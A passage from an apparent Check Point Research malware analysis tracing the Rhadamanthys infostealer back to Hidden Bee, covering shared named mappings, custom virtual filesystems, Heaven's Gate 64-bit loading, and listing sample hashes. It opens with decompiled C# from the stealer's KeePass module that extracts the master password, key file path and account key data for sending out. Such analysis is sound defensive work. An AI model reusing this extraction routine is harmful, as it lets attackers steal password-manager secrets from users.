<pre class="EnlighterJSRAW" data-enlighter-language="csharp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Token: 0x06000006 RID: 6 RVA: 0x00002150 File Offset: 0x00000350
        private static void KcpDump()
        {
            Dictionary&lt;string, byte[]> dictionary = new Dictionary&lt;string, byte[]>();
            object fieldInstance = Assembly.GetEntryAssembly().EntryPoint.DeclaringType.GetFieldStatic("m_formMain").GetFieldInstance("m_docMgr").GetFieldInstance("m_dsActive").GetFieldInstance("m_pwDb");
            object fieldInstance2 = fieldInstance.GetFieldInstance("m_pwUserKey");
            string s = fieldInstance.GetFieldInstance("m_ioSource").GetFieldInstance("m_strUrl").ToString();
            IEnumerable enumerable = (IList)fieldInstance2.GetFieldInstance("m_vUserKeys");
            dictionary.Add("U", Encoding.UTF8.GetBytes(s));
            foreach (object obj in enumerable)
            {
                string name = obj.GetType().Name;
                if (!(name == "KcpPassword"))
                {
                    if (!(name == "KcpKeyFile"))
                    {
                        if (name == "KcpUserAccount")
                        {
                            byte[] value = (byte[])obj.GetFieldInstance("m_pbKeyData").RunMethodInstance("ReadData", Array.Empty&lt;object>());
                            dictionary.Add("A", value);
                        }
                    }
                    else
                    {
                        object fieldInstance3 = obj.GetFieldInstance("m_strPath");
                        dictionary.Add("K", Encoding.UTF8.GetBytes(fieldInstance3.ToString()));
                    }
                }
                else
                {
                    string s2 = (string)obj.GetFieldInstance("m_psPassword").RunMethodInstance("ReadString", Array.Empty&lt;object>());
                    dictionary.Add("P", Encoding.UTF8.GetBytes(s2));
                }
            }
            Program.KcpDumpSendData(dictionary);
        }</pre>



<p><em>Note &#8211; Covering the full functionality of this Stage is out of the scope of this article. Some of it was described in the previous Check Point Rhadamanthys publication [<a href="https://research.checkpoint.com/2023/rhadamanthys-the-everything-bagel-infostealer/">1</a>] and may be continued as the next part of this series.</em></p>



<h2 class="wp-block-heading" id="other-similarities-with-hidden-bee">Other similarities with Hidden Bee</h2>



<p>The custom formats that we described here have clear similarities to Hidden Bee. But that is not the only thing these two malware families have in common. We can clearly see that the design, and even fragments of the code, are reused.</p>



<h3 class="wp-block-heading" id="data-sharing-via-named-mapping">Data sharing via named mapping</h3>



<p>Hidden Bee, as well as Rhadamanthys, consists of multiple modules that can run in different processes. Sometimes, they need to share data from one process to another. For this purpose, the author decided to use a shared memory area that is accessed by different processes via named mapping.</p>



<p>Example from Hidden Bee:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId252.png" alt="Figure 60: Hidden Bee creating named mapping to store the data."/><figcaption class="wp-element-caption">Figure 60: Hidden Bee creating named mapping to store the data.</figcaption></figure></div>


<p>We can see a similar use of named mapping in Rhadamanthys. The malware may need to start a new process where it can inject its module. However, some data from the current process must be forwarded there. To do so, a named mapping is created. The data is entered and is retrieved from within the next process:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId255.png" alt="Figure 61: Rhadamanthys creating and filling named mapping before
starting a new infected process."/><figcaption class="wp-element-caption">Figure 61: Rhadamanthys creating and filling named mapping before starting a new infected process.</figcaption></figure>



<p>Those shared memory pages contain a variety of content such as configuration, encryption keys, checksums of the functions that are loaded by additional modules, etc. It is also a space where the virtual filesystem can be mounted, that is, the package in a custom format with various files, including executable modules. The modules are retrieved by their names or paths (depending on the specific format’s characteristics).</p>



<h3 class="wp-block-heading" id="retrieving-components-from-virtual-filesystems">Retrieving components from virtual filesystems</h3>



<p>In articles from 2019 about Hidden Bee [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>] [<a href="https://www.malwarebytes.com/blog/news/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack">9</a>], a glimpse into the virtual filesystems and the embedded components was given. We can find there familiar-looking paths:&nbsp;<code>/bin/amd64/preload</code>,&nbsp;<code>/bin/amd4/coredll.bin</code>, etc.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="769" height="614" src="https://research.checkpoint.com/wp-content/uploads/2023/08/choose_modules.png" alt="" class="wp-image-28673" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/choose_modules.png 769w, https://research.checkpoint.com/wp-content/uploads/2023/08/choose_modules-300x240.png 300w" sizes="(max-width: 769px) 100vw, 769px" /><figcaption class="wp-element-caption">Figure 62: Screenshot from Hidden Bee loading the modules: “preload” and “coredll.bin”. Source: [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>]</figcaption></figure></div>


<p>Interestingly, the same paths occur in Rhadamanthys in an unchanged form. Just like in Hidden Bee, they are used to reference the components from the virtual file system:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId262.png" alt="Figure 63: Loading of the modules: “preload” and “coredll.bin”
(Rhadamanthys)"/><figcaption class="wp-element-caption">Figure 63: Loading of the modules: “preload” and “coredll.bin” (Rhadamanthys)</figcaption></figure>



<p>Hidden Bee, as well as Rhadamanthys, uses diverse formats for the virtual filesystems. As it was noted during the Hidden Bee analysis [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>], the author based this part on&nbsp;<a href="https://docs.kernel.org/filesystems/romfs.html">ROMFS</a>. However, over time, the structure diverged significantly from its predecessor and is fully custom in its current form. There are, however, some artifacts that lead us to conclude that the file systems used by Rhadamanthys are simply the next step in the evolution of the ones used in Hidden Bee. The most obvious similarity is the magic:&nbsp;<code>!Rex</code>:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="599" height="348" src="https://research.checkpoint.com/wp-content/uploads/2023/08/rex_format.png" alt="" class="wp-image-28674" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/rex_format.png 599w, https://research.checkpoint.com/wp-content/uploads/2023/08/rex_format-300x174.png 300w" sizes="(max-width: 599px) 100vw, 599px" /><figcaption class="wp-element-caption">Figure 64: The buffer is checked to verify that it follows the expected format, and if it starts from the !Rex magic (Rhadamanthys)</figcaption></figure></div>


<p>Hidden Bee was known for using formats with very similar names of packages, such as&nbsp;<code>!rbx</code>,&nbsp;<code>!rcx</code>, and&nbsp;<code>!rdx</code>, and for exactly the same purposes.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="549" height="443" src="https://research.checkpoint.com/wp-content/uploads/2023/08/checking_the_marker.png" alt="" class="wp-image-28676" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/checking_the_marker.png 549w, https://research.checkpoint.com/wp-content/uploads/2023/08/checking_the_marker-300x242.png 300w" sizes="(max-width: 549px) 100vw, 549px" /><figcaption class="wp-element-caption">Figure 65: Example from Hidden Bee &#8211; checking the !rbx package marker. Source [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>]</figcaption></figure></div>


<h3 class="wp-block-heading" id="heavens-gate-and-loading-64-bit-modules-from-32-bit">Heaven’s Gate and loading 64-bit modules from 32-bit</h3>



<p>The initial executable of Rhadamanthys, as well as of Hidden Bee, is 32-bit. However, the further modules may be 64-bit. That means the malware has to find a way to deploy them.</p>



<p>Loading 64-bit modules from a 32-bit process is not typically supported. Therefore, the executable needs to use a technique that is not officially documented but well known in malware development circles: Heaven’s Gate (more about this technique&nbsp;<a href="https://www.malwarebytes.com/blog/news/2018/01/a-coin-miner-with-a-heavens-gate">here</a>).</p>



<p>Let’s have a look at how a 64-bit custom module is loaded in Rhadamanthys:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId274.png" alt="Figure 66: Rhadamanthys Stage 2 component loading a 64-bit module
“unhook.bin”"/><figcaption class="wp-element-caption">Figure 66: Rhadamanthys Stage 2 component loading a 64-bit module “unhook.bin”</figcaption></figure>



<p>If the system is recognized as 64-bit, a new 64-bit module is loaded from the package. The module is fetched by name. Next, a memory for it is allocated, and it is copied there, section by section.</p>



<p>The assembly fragment illustrates how the Heaven’s Gate is implemented:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId277.png" alt="Figure 67: Heaven’s Gate in Rhadamanthys"/><figcaption class="wp-element-caption">Figure 67: Heaven’s Gate in Rhadamanthys</figcaption></figure></div>


<p>The malware pushes on the stack the value&nbsp;<strong>0x33</strong>&nbsp;and then the next line’s address. When the far return is called, the execution returns to the next address but prefixed with the segment&nbsp;<strong>0x33</strong>, which causes the switch to the 64-bit mode. This means that all further instructions will now be interpreted as 64-bit. The loading of the custom module continues in 64-bit mode. As we can’t switch the code interpretation directly in IDA, let’s see how it looks in&nbsp;<a href="https://github.com/hasherezade/pe-bear">PE-bear</a>:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId281.png" alt="Figure 68: Fragment of the 64-bit code in the 32-bit application
(Rhadamanthys), executed after the Heaven’s Gate has been called."/><figcaption class="wp-element-caption">Figure 68: Fragment of the 64-bit code in the 32-bit application (Rhadamanthys), executed after the Heaven’s Gate has been called.</figcaption></figure>



<p>The module, which is 64-bit, will continue its own loading.</p>



<p>Similar building blocks to load the 64-bit module from a 32-bit process can be found in Hidden Bee. In the below case, a shellcode&nbsp;<code>shim.bin</code>&nbsp;is first fetched from the virtual filesystem in the&nbsp;<code>!rdx</code>&nbsp;format. A shared section is created, where the malware enters the needed data. Note that inputting the checksums is analogous to the case from Rhadamanthys, shown in Figure 61.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="788" height="994" src="https://research.checkpoint.com/wp-content/uploads/2023/08/inject_shim.png" alt="" class="wp-image-28677" srcset="https://research.checkpoint.com/wp-content/uploads/2023/08/inject_shim.png 788w, https://research.checkpoint.com/wp-content/uploads/2023/08/inject_shim-238x300.png 238w, https://research.checkpoint.com/wp-content/uploads/2023/08/inject_shim-768x969.png 768w" sizes="(max-width: 788px) 100vw, 788px" /><figcaption class="wp-element-caption">Figure 69: Hidden Bee’s core.bin (32-bit version) injecting shim.bin. The application creates a new process and then passes data to it via the named mapped section.</figcaption></figure></div>


<p>Finally, the execution is switched to 64-bit mode via Heaven’s Gate, analogously to the previous case:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId287.png" alt="Figure 70: Heaven’s Gate in the module “core.bin” of Hidden Bee"/><figcaption class="wp-element-caption">Figure 70: Heaven’s Gate in the module “core.bin” of Hidden Bee</figcaption></figure></div>


<h2 class="wp-block-heading" id="conclusion">Conclusion</h2>



<p>There are many parallels between Hidden Bee and Rhadamanthys which strongly hint that the recently released stealer isn’t brand new but instead is a continuation of the author’s earlier work. The consistency of the design also suggests that the development is continued by the same author/authors as Hidden Bee and not merely inspired by or based on an obtained code.</p>



<p>Considering how quickly Rhadamanthys is updated, it is clear that we are dealing with a highly professional actor that keeps innovating and constantly improving the product, as well as incorporating learned techniques and PoCs. We can expect that the custom formats used for the executables, as well as for the virtual filesystems, will continue to evolve.</p>



<p>Looking at the trends, we believe that Rhadamanthys is here to stay, so it is worth keeping up with the evolution of those formats, as converting them to PE makes the analysis process much easier and faster.</p>



<p>Our converters are available at:</p>



<ul class="wp-block-list">
<li><a href="https://github.com/hasherezade/hidden_bee_tools/tree/master/bee_lvl2_converter">https://github.com/hasherezade/hidden_bee_tools/tree/master/bee_lvl2_converter</a></li>
</ul>



<p><em><strong>Check Point customers remain protected from the threats described in this research.</strong></em></p>



<p><em><strong>Check Point’s&nbsp;<a href="https://www.checkpoint.com/infinity/zero-day-protection/">Threat Emulation</a>&nbsp;provides comprehensive coverage of attack tactics, file types, and operating systems&nbsp;and&nbsp;has developed and deployed a signature to detect and protect customers against threats described in this research.</strong></em></p>



<p><em><strong>Check Point’s&nbsp;<a href="https://www.checkpoint.com/harmony/advanced-endpoint-protection/">Harmony Endpoint</a>&nbsp;provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise. Behavioral Guard protections were developed and deployed to protect customers against threats described in this research.</strong></em></p>



<p><strong>TE/Harmony Endpoint protections:</strong></p>



<ul class="wp-block-list">
<li><em>InfoStealer.Wins.Rhadamanthys.C/D</em></li>
</ul>



<h2 class="wp-block-heading" id="iocanalyzed-samples">IOC/Analyzed samples</h2>



<figure class="wp-block-table"><table><thead><tr><th>ID</th><th>Hash</th><th>Module type</th><th>Format</th></tr></thead><tbody><tr><td>#1.1</td><td>39e60dbcfa3401c2568f8ef27cf97a83d16fdbd43ecf61c3be565ee4e7b9092e</td><td>Packed sample (distributed in a campaign)</td><td>PE</td></tr><tr><td>#1.2</td><td>bd694e981db5fba281c306dc622a1c5ee0dd02efc29ef792a2100989042f0158</td><td>Stage 1 (unpacked from #1.1); RS/HS variant</td><td>PE</td></tr><tr><td>#1.3</td><td>3ecb1f99328a188d1369eb491338788b9ddeba6c038f0c14de275ee7ab96694b</td><td>Stage 2: main module</td><td>RS</td></tr><tr><td>#1.4</td><td>3aa34d44946b4405cd6fc85c735ae2b405d597a5ab018a6c46177f4e1b86d11a</td><td>Stage 3: main stealer component</td><td>HS</td></tr><tr><td>#2.1</td><td>301cafc22505f558744bb9ed11d17e2b0ebd07baa3a0f59d1650d119ede4ceeb</td><td>Stage 1 (version 0.4.1); RS/HS variant</td><td>PE</td></tr><tr><td>#2.2</td><td>f336cd910b9cfbe13a5d94fcdbac1be9c901a2dfd7ac0da82fbb9e8a096ac212</td><td>Stage 2 (from #2.1): main module</td><td>RS</td></tr><tr><td>#2.3</td><td>e69f284430cd491d97b017f7132ad46fef3d814694b29bd15aaa07d206fa4001</td><td>Stage 2 submodule: “unhook.bin”</td><td>HS</td></tr><tr><td>#3.1</td><td>1eb7e20cc13f622bd6834ef333b8c44d22068263b68519a54adc99af5b1e6d34</td><td>Packed sample (distributed in a campaign)</td><td>PE</td></tr><tr><td>#3.2</td><td>a13376875d3b492eb818c5629afd3f97883be2a5154fa861e7879d5f770e21d4</td><td>Stage 1 (unpacked from #3.1); XS variant</td><td>PE</td></tr><tr><td>#3.3</td><td>0c0753affec66ea02d4e93ced63f95e6c535dc7d7afb7fcd7e75a49764fbef0d</td><td>Stage 2 (main module, from #3.2)</td><td>XS</td></tr><tr><td>#4.1</td><td>0f0760eb43d1a3ed16b4842b25674e4d6d1239766243bac1d4c19341bb37d5b8</td><td>Packed sample (distributed in a campaign)</td><td>PE</td></tr><tr><td>#4.2</td><td>b542b29e51e01cec685110991acf28937ad894ba30dc8e044ef66bb8acbed210</td><td>Stage 1 (unpacked from #4.1); XS variant</td><td>PE</td></tr><tr><td>#4.3</td><td>5af4507b1ae510b21d8c64e1e6fb518bf8d63ff03156eb0406b1193e10308302</td><td>Stage 2: main module (v0.4.9)</td><td>XS</td></tr><tr><td>#4.4</td><td>90290bed8745f9e2ca37538f5f47bf71b5beb53b29027390e18e8b285b764f55</td><td>Stage 2 submodule: “netclient.bin”</td><td>XS</td></tr><tr><td>#4.4</td><td>eca3b3fa9fc6158eae8c978ab888966ab561f39c905a316ef31d5613f1018124</td><td>Stage 2 submodule: “dt.bin”</td><td>XS</td></tr><tr><td>#4.5</td><td>50ebe2ac91a2f832bab7afce93cf2fc252a3694ee4e3829a6ccb2786554a3830</td><td>Stage 2 submodule: “phexec.bin”</td><td>XS</td></tr><tr><td>#4.6</td><td>e65973cfa8ae7fb4305c085c30348aef702fb5fc4118f83c8cdc498ae01e81f7</td><td>Stage 2 submodule: “commit.bin”</td><td>XS</td></tr><tr><td>#4.7</td><td>648cf25ac347e4a37f8e8f837a7866f591da863ce40ce360c243b116dbb0f2b5</td><td>Stage 2 submodule: “heur.bin”</td><td>XS</td></tr><tr><td>#4.8</td><td>31d89c4bba78cab67a791ebc2a829ad1f81d342ad96b47228f2c96038a1ff707</td><td>Stage 2 submodule: “proto.bin”</td><td>shellcode</td></tr><tr><td>#4.9</td><td>9d69149b6b2dd202870ff5ce49b1ef166b628e44da22d63151bd155e52aadee8</td><td>Stage 2 submodule: “unhook.bin”</td><td>XS</td></tr><tr><td>#5.1</td><td>a717bafa929893e64dbd2fc6b38dbeed2efc7308f1bc3e1eaf52dfc8114091ad</td><td>Stage 1 (original); XS variant</td><td>PE</td></tr><tr><td>#6.1</td><td>b87c03183b84e3c7ec319d7be7c38862f33d011ff160cb1385aea70046f5a67b</td><td>Packed sample (distributed in a campaign)</td><td>PE</td></tr><tr><td>#6.2</td><td>158b1f46777461ac9e13216ee136a0c8065c2d3e7cb1f00e6b0ca699f6815498</td><td>Stage 1; XS variant</td><td>PE</td></tr><tr><td>#7.1</td><td>7de67b4ae3475e1243c80ba446a8502ce25fec327288d81a28be69706b4d9d81</td><td>Packed sample (distributed in a campaign)</td><td>PE</td></tr><tr><td>#8.1</td><td>85d104c4584ca1466a816ca3e34b7b555181aa0e8840202e43c2ee2c61b6cb84</td><td>Stage 1 (version 0.4.5); XS variant</td><td>PE</td></tr><tr><td>#9.1</td><td>a1fce39c4db5f1315d5024b406c0b0fb554e19ff9b6555e46efba1986d6eff2e</td><td>Stage 1 (version 0.4.6); XS variant</td><td>PE</td></tr><tr><td>#9.2</td><td>0ca1f5e81c35de6af3e93df7b743f47de9f2791af25020d6a9fafab406edebb2</td><td>Stage 2: main module (from #8.1, #9.1)</td><td>XS</td></tr><tr><td>#10.1</td><td>f0f70c6ba7dcb338794ee0034250f5f98fc6bddea0922495af863421baf4735f</td><td>Stage 1 (version 0.4.9)</td><td>PE</td></tr><tr><td>#11.1</td><td>9ab214c4e8b022dbc5038ab32c5c00f8b351aecb39b8f63114a8d02b50c0b59b</td><td>Stage 1 (version 0.4.9)</td><td>PE</td></tr><tr><td>#11.2</td><td>ae30e2f276a49aa4f61066f0eac0b6d35a92a199e164a68a186cba4291798716</td><td>Stage 3: main stealer component</td><td>XS</td></tr><tr><td>#11.3</td><td>fcb00beaa88f7827999856ba12302086cadbc1252261d64379172f2927a6760e</td><td>Stage 3 submodule: “KeePassHax.dll”</td><td>PE</td></tr><tr><td>#11.4</td><td>40ab8104b734d5666b52a550ed30f69b8a3d554d7ed86d4f658defca80b220fb</td><td>Stage 3 submodule: “runtime.exe”</td><td>PE</td></tr><tr><td>#11.5</td><td>a462783e32dceef3224488d39a67d1a9177e65bd38bc9c534039b10ffab7e7ba</td><td>Stage 3 submodule: “stubmod.bin” (64-bit)</td><td>XS</td></tr><tr><td>#11.6</td><td>2a8b2eca9c5f604478ffc9103136c4720131b0766be041d47898afc80984fd78</td><td>Stage 3 submodule: “stubmod.bin” (32-bit)</td><td>XS</td></tr><tr><td>#11.7</td><td>ae30e2f276a49aa4f61066f0eac0b6d35a92a199e164a68a186cba4291798716</td><td>Stage 3 submodule: “coredll.bin” (64-bit)</td><td>XS</td></tr><tr><td>#11.8</td><td>a4fe1633586f7482b655c02c1b7470608a98d8159b7248c05b6d557109aef8d9</td><td>Stage 3 submodule: “coredll.bin” (32-bit)</td><td>XS</td></tr><tr><td>#11.9</td><td>7f96fcddf5bfb361943ef491634ef007800a151c0fcbff46bde81441383f759e</td><td>Stage 3 submodule: “stubexec.bin” (64-bit)</td><td>XS</td></tr></tbody></table></figure>



<h3 class="wp-block-heading" id="reference-material">Reference material</h3>



<p>Hidden Bee filesystems (containing referenced modules):</p>



<figure class="wp-block-table"><table><thead><tr><th>ID</th><th>Hash</th><th>Module type</th><th>Format</th></tr></thead><tbody><tr><td>#6</td><td>b828072d354f510e2030ef9cad6f00546b4e06f08230960a103aab0128f20fc3</td><td>Hidden Bee filesystem (preloads)</td><td>!rdx</td></tr><tr><td>#7</td><td>c95bb09de000ba72a45ec63a9b5e46c22b9f1e2c10cc58b4f4d3980c30286c91</td><td>Hidden Bee filesystem (miners)</td><td>!rdx</td></tr></tbody></table></figure>



<p>The modules embedded in the filesystems can be retrieved with the help of the decoder:&nbsp;<a href="https://github.com/hasherezade/hidden_bee_tools/tree/master/rdx_converter">https://github.com/hasherezade/hidden_bee_tools/tree/master/rdx_converter</a></p>



<h2 class="wp-block-heading" id="appendix">Appendix</h2>



<p><strong>Other writeups on Rhadamanthys:</strong></p>



<p>[1] “Rhadamanthys: The”Everything Bagel” Infostealer”:&nbsp;<a href="https://research.checkpoint.com/2023/rhadamanthys-the-everything-bagel-infostealer/">https://research.checkpoint.com/2023/rhadamanthys-the-everything-bagel-infostealer/</a></p>



<p>[2] Kaspersky found the link between HiddenBee and Rhadamanthys:&nbsp;<a href="https://twitter.com/kaspersky/status/1667018902549692416">https://twitter.com/kaspersky/status/1667018902549692416</a></p>



<p>[3] Kaspersky’s crimeware report referencing Rhadamanthys and its similarity to Hidden Bee:&nbsp;<a href="https://securelist.com/crimeware-report-uncommon-infection-methods-2/109522/">https://securelist.com/crimeware-report-uncommon-infection-methods-2/109522/</a></p>



<p>[4] ZScaler’s article mentioning the usage of the Hidden Bee formats:&nbsp;<a href="https://www.zscaler.com/blogs/security-research/technical-analysis-rhadamanthys-obfuscation-techniques">https://www.zscaler.com/blogs/security-research/technical-analysis-rhadamanthys-obfuscation-techniques</a></p>



<p>[5] “Dancing With Shellcodes: Analyzing Rhadamanthys Stealer” by Eli Salem:&nbsp;<a href="https://elis531989.medium.com/dancing-with-shellcodes-analyzing-rhadamanthys-stealer-3c4986966a88">https://elis531989.medium.com/dancing-with-shellcodes-analyzing-rhadamanthys-stealer-3c4986966a88</a></p>



<p>and more:&nbsp;<a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.rhadamanthys">https://malpedia.caad.fkie.fraunhofer.de/details/win.rhadamanthys</a></p>



<p><strong>Writeups on Hidden Bee:</strong></p>



<p>[6]&nbsp;<a href="https://www.malwarebytes.com/blog/news/2018/07/hidden-bee-miner-delivered-via-improved-drive-by-download-toolkit">https://www.malwarebytes.com/blog/news/2018/07/hidden-bee-miner-delivered-via-improved-drive-by-download-toolkit</a></p>



<p>[7]&nbsp;<a href="https://www.malwarebytes.com/blog/news/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements">https://www.malwarebytes.com/blog/news/2018/08/reversing-malware-in-a-custom-format-hidden-bee-elements</a></p>



<p>[8]&nbsp;<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole</a></p>



<p>[9]&nbsp;<a href="https://www.malwarebytes.com/blog/news/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack">https://www.malwarebytes.com/blog/news/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack</a></p>



<p>and more:&nbsp;<a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.hiddenbee">https://malpedia.caad.fkie.fraunhofer.de/details/win.hiddenbee</a></p>
					</div>			
				</div>
				 
				<div class="back-to-top">
					<a  href="#single-post">
										<div class="image center">
						<img src="https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg" alt="" />
					</div>
										
											GO UP							
					</a>
				</div>
										<div class="button-wrap center">
						<a class="button background-skyblue font-white skyblue-border" href="/latest-publications/">BACK TO ALL POSTS</a>
					</div>
						

			</div>
			 
				<div class="flex-4">
					
<div class="sidebar-post-wrapper">
		<div class="sidebar-post-inner"></div>
				<div class="sidebar-post-categories popular">
				<div class="aside-box">
					<h2>POPULAR POSTS</h2>
				<div class="blog-most-popular font-white">
									<div class="blog-most-popular-row relative">
										<a class="background-image"  href="https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/">
						<img src="https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg" alt=""/>						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Artificial Intelligence</li>													<li>ChatGPT</li>													<li>Check Point Research Publications</li>											</ul>
					<a href="https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/">OPWNAI : Cybercriminals Starting to Use ChatGPT</a>
				</div>
			</div>
									<div class="blog-most-popular-row relative">
										<a class="background-image"  href="https://research.checkpoint.com/2019/hacking-fortnite/">
						<img src="https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg" alt=""/>						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Check Point Research Publications</li>													<li>Threat Research</li>											</ul>
					<a href="https://research.checkpoint.com/2019/hacking-fortnite/">Hacking Fortnite Accounts</a>
				</div>
			</div>
									<div class="blog-most-popular-row relative">
										<a class="background-image"  href="https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/">
						<img src="https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg" alt=""/>						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Artificial Intelligence</li>													<li>ChatGPT</li>													<li>Check Point Research Publications</li>											</ul>
					<a href="https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/">OpwnAI: AI That Can Save the Day or HACK it Away</a>
				</div>
			</div>
					</div>
	</div>
		</div>
		</div>  
				</div>
						
		</div>
	</div>
		
		 

<div class="aside-box">
	<div class="container container-wide">
	<div class="text font-blue-- section-title">
		<h3>BLOGS AND PUBLICATIONS</h3>
	</div>
	</div>
					<div class="blog-most-recent font-white">
														<div class="blog-slide">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg')">
								<img src="https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg" alt=""/>
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>																	<li>Global Cyber Attack Reports</li>																	<li>Threat Research</li>															</ul>
							<div class="text" onclick="location.href = 'https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/';" >
								<span class="date small-font">February 17, 2020</span>
								<h3>“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign</h3>
							</div>
						</div>
					</div>
														<div class="blog-slide">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt=""/>
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text" onclick="location.href = 'https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/';" >
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div>
														<div class="blog-slide">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg')">
								<img src="https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg" alt=""/>
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text" onclick="location.href = 'https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/';" >
								<span class="date small-font">January 11, 2018</span>
								<h3>‘RubyMiner’ Cryptominer Affects 30% of WW Networks</h3>
							</div>
						</div>
					</div>
								
			</div>
			<div class="progress blog-most-recent-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
				<span class="slider__label sr-only blog-recent-bar"> </span>
			</div>
		</div>	
</section>

<footer class="footer section-padding background-skyblue">
	<div class="footer-top margin-bottom">
		<div class="container container-wide">
			<div class="flex-row footer-content">
				<div class="flex-2 box left">
					<a href="https://research.checkpoint.com"><img src="https://research.checkpoint.com/wp-content/uploads/2022/12/CheckPointResearchLogo_white-1-e1671590634727.png"  alt="" class="img-responsive" /></a>					<div class="social-media-wrapper">				
						<div class="social-icons">
																																											<a href="https://www.linkedin.com/company/check-point-software-technologies/" target="_blank"><svg  style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><g id="XMLID_801_">	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73		C77.16,101.969,74.922,99.73,72.16,99.73z"/>	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319		